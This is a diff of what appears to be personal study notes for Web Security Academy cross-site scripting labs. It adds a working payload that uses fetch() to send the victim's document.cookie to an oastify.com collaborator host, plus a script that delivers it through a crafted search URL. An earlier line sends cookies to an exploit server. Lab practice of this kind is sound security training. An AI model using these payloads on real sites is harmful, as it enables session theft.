@@ -596,8 +596,14 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
 <xss autofocus tabindex=1 onfocus=document.location='https://exploit-0a0200e204b1e3f580a2345e018a0029.exploit-server.net/?c='+document.cookie></xss>
 ```
 - Using fetch()
+
 ```html
-(funcional al 100%)
+(payload funcional)
+<xss onfocus=fetch(`https://gj3j6w7f1w75dj2yqsskzl8ktbz2n2br.oastify.com/?cookie=`+document.cookie) autofocus tabindex=1>
+```
+
+```html
+(exploit server to deliver to victim)
 <script>
 document.location='https://0a6f0066043ebdad81764db3003d0079.web-security-academy.net/?search=%3Cxss+onfocus%3dfetch(`https://gj3j6w7f1w75dj2yqsskzl8ktbz2n2br.oastify.com/?cookie=`%2bdocument.cookie)+autofocus+tabindex%3d1%3E'
 </script>
